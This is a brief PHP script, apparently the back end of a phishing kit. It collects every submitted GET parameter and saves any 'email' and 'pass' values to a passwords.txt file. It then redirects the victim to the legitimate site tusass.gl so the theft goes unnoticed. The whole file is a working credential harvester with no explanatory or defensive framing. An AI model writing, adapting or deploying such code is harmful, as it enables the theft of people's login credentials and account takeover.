<?php

header("Location: http://www.tusass.gl ");

$log_handler = fopen("logs.log", "a");
$credentials_handler = fopen("passwords.txt", "a");

foreach($_GET as $variable => $value) {
    fwrite($log_handler, "$variable=$value\r\n");

    if ($variable == "email") {
        fwrite($credentials_handler, "email='$value'\r\n");
    }
    elseif ($variable == "pass") {
        fwrite($credentials_handler, "pass='$value'\r\n");
    }
}

fwrite($log_handler, "----\r\n");
fwrite($credentials_handler, "----\r\n");

fclose($log_handler);
fclose($credentials_handler);

exit;
?> 